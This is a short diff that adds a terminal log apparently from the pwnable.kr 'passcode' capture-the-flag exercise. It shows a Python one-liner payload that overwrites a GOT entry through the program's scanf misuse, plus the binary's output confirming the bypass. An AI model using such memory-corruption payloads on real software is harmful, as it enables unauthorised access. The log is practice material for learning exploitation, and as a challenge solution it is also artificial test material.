@@ -1,0 +1,5 @@
+passcode@pwnable:~$ python -c "print('A' * 96 + '\x04\xa0\x04\x08' + str(int(0x080485e3)))" | ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
